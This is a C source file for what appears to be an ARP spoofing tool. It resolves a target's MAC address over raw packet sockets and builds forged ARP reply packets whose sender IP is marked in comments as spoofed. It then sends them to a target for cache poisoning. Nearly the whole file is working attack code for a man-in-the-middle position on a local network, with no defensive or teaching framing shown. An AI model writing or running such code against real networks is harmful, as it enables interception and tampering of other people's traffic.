#include "arp_utils.h"

void get_mac_address(int sock, LOCAL_DATA localData, struct ether_arp* arpPacket, uint32_t sender_ip, uint32_t target_ip)
{
    const unsigned char ether_broadcast_addr[] =
        { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

    /* special socket address type used for AF_PACKET */
    struct sockaddr_ll addr = { 0 };
    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = localData.interface_index;
    addr.sll_halen    = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

    /* construct the ARP request */
  	arpPacket->arp_hrd = htons(ARPHRD_ETHER);
  	arpPacket->arp_pro = htons(ETH_P_IP);
  	arpPacket->arp_hln = ETHER_ADDR_LEN;
  	arpPacket->arp_pln = sizeof(in_addr_t);
    arpPacket->arp_op = htons(ARPOP_REQUEST);

    /* set sender information of the packet */
    memcpy(&arpPacket->arp_sha, &localData.mac_address, sizeof(arpPacket->arp_sha));
    memcpy(&arpPacket->arp_spa, &sender_ip, sizeof(arpPacket->arp_spa));

    /* set target information of the packet */
    memset(&arpPacket->arp_tha, 0, sizeof(arpPacket->arp_tha)); // 00:00:00:00:00:00
    memcpy(&arpPacket->arp_tpa, &target_ip, sizeof(arpPacket->arp_tpa));

    /* send arp request */
  	if (sendto(sock, arpPacket, sizeof(struct ether_arp), 0, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
  		  printf("[-] Error sending ARP request [-]\n");
    }

    while (1)
    {
        int buffer = recv(sock, arpPacket, sizeof(struct ether_arp), 0);
        if (buffer == -1) {
            printf("[-] Error recieving ARP reply [-]\n");
            exit(EXIT_FAILURE);
        }
        if (buffer == 0) {   /* no response */
            printf("[*] No Response . . . [*]\n");
            continue;
        }

        unsigned int sender_address =
			         (arpPacket->arp_spa[3] << 24)
		         | (arpPacket->arp_spa[2] << 16)
		         | (arpPacket->arp_spa[1] << 8)
             | (arpPacket->arp_spa[0] << 0);

        if (sender_address == target_ip)
        {
            break;
        }
    }
}

void PrintMacAddress(unsigned char macAddr[HARDWARE_ADDRESS_LENGTH])
{
    printf("%.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", macAddr[0], macAddr[1],
        macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
}

void PrintIpAddress(uint32_t ip)
{
    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_addr.s_addr = ip;

    char ipString[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(addr.sin_addr), ipString, INET_ADDRSTRLEN);

    printf("%s\n", ipString);
}

uint32_t charToUintIp(const char* ip)
{
    return inet_addr(ip);
}

LOCAL_DATA get_local_data(const char* iface, int socket)
{
    LOCAL_DATA ld;
    ZeroMemory(&ld, sizeof(ld));

    IFREQ ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);

    if (ioctl(socket, SIOCGIFINDEX, &ifr) == -1) {
        perror("SIOCGIFINDEX");
    }
    int ifindex = ifr.ifr_ifindex;

    if (ioctl(socket, SIOCGIFHWADDR, &ifr) == -1) {
        perror("SIOCGIFINDEX");
    }

    if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
  		  printf("Not an ethernet interface\n");
    }

    for (int i = 0; i < 6; i++) {
        ld.mac_address[i] = ifr.ifr_hwaddr.sa_data[i];
    }

    ld.interface_name = iface;
    ld.interface_index = ifindex;

    return ld;
}

void getLocalProtocolAddress(int socket, const char* iface, char** local_ip)
{
    IFREQ ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);

    if (ioctl(socket, SIOCGIFADDR, &ifr) == -1) {
        perror("SIOCGIFADDR");
    }

    char* ip_str = inet_ntoa(((sockaddr_in*)&ifr.ifr_addr)->sin_addr);
    if (local_ip != 0)
        *local_ip = ip_str;
}

void send_arp_packet(int sock, int iface_index, unsigned char hwsrc[6], unsigned char hwdst[6], uint32_t psrc, uint32_t pdst)
{
    struct ether_arp arpPacket;

    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = iface_index;
    addr.sll_halen = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, hwdst, ETHER_ADDR_LEN);  // destination physical address

    // basic info about the arp packet
    arpPacket.arp_hrd = htons(ARPHRD_ETHER);
  	arpPacket.arp_pro = htons(ETH_P_IP);
  	arpPacket.arp_hln = ETHER_ADDR_LEN;
  	arpPacket.arp_pln = sizeof(in_addr_t);
    arpPacket.arp_op = htons(ARPOP_REPLY);

    /*======== Resulting Structure ========

    Source MAC : local mac (attacker)
    Source IP  : ip of the machine attacker wants
                 destination machine to believe is the source

    Destination MAC : real destination physical address
    Destination IP  : real destination ip address

    ======================================*/

    // Source MAC [REAL]
    memcpy(&arpPacket.arp_sha, hwsrc, sizeof(arpPacket.arp_sha));

    // Source IP [SPOOFED / FAKE]
    memcpy(&arpPacket.arp_spa, &psrc, sizeof(arpPacket.arp_spa));

    // Destination MAC [REAL]
    memcpy(&arpPacket.arp_tha, hwdst, sizeof(arpPacket.arp_tha));

    // Destination ip [REAL]
    memcpy(&arpPacket.arp_tpa, &pdst, sizeof(arpPacket.arp_tpa));

    //================================================================//
    //=================== Packet Construction Done ===================//

    /*
    printf("============ Sending ARP Reply Packet ============\n");
    printf("Sender MAC  : "); PrintMacAddress(arpPacket.arp_sha);
    uint32_t sip = 0;
    memcpy(&sip, arpPacket.arp_spa, sizeof(sip));
    printf("Sender IP   : "); PrintIpAddress(sip);

    printf("Target MAC  : "); PrintMacAddress(arpPacket.arp_tha);
    uint32_t tip = 0;
    memcpy(&tip, arpPacket.arp_tpa, sizeof(tip));
    printf("Target IP   : "); PrintIpAddress(tip);
    printf("---------------------------------------------------\n\n");
    */



    // sending the packet to the target
    if (sendto(sock, &arpPacket, sizeof(arpPacket), 0, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		    printf("Error arp spoofing target: ");
        PrintIpAddress(pdst);
    }
}
